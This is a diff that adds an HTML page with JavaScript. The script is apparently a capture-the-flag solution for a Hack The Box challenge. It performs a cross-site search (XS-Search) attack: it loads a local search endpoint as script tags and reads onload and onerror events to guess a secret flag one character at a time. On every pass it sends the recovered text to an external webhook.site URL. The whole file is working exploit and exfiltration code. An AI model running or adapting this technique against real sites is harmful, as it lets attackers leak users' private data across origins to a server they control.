@@ -1,0 +1,55 @@
+<body></body>
+<script>
+    async function sleep(ms) {
+    return new Promise((resolve) => setTimeout(resolve, ms));
+  }
+
+  async function probeError(url) {
+    return await new Promise((resolve, reject) => {
+      const script = document.createElement("script");
+      script.src = url;
+      // onload is triggered when we get an HTTP success code (e.g. 200)
+      script.onload = resolve;
+      // onerror is triggered when we get an HTTP error code (e.g. 404)
+      script.onerror = reject;
+
+      document.head.appendChild(script);
+    });
+  }
+  async function search(query) {
+    try {
+      await probeError(
+        `http://127.0.0.1:1337/api/entries/search?q=${query}` 
+      );
+      return true;
+    } catch (e) {
+      return false;
+    }
+  }
+  async function exploit() {
+    let flag = "HTB{";
+    let query;
+    // keep going until we hit the end of the flag
+    while (flag.charAt(flag.length - 1) !== "}") {
+      console.log(flag);
+      for (let c of "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!_") {
+        query = flag + c;
+        if (await search(query)) {
+          // success! we got an http 200
+        //   console.log(`YES - ${query}`);
+          flag = query;
+          break;
+        } else {
+          // we got an http 404
+        //   console.log(`NO - ${query}`);
+        // flag = query+"#";
+        }
+      }
+      try {
+        // send whatever characters we have obtained so far to our webhook
+        await fetch(`https://webhook.site/d96532b1-e513-4a42-9a50-de9c440e1dcd?${flag}`);
+      } catch(e) {}
+    }
+  }
+  exploit();
+</script>
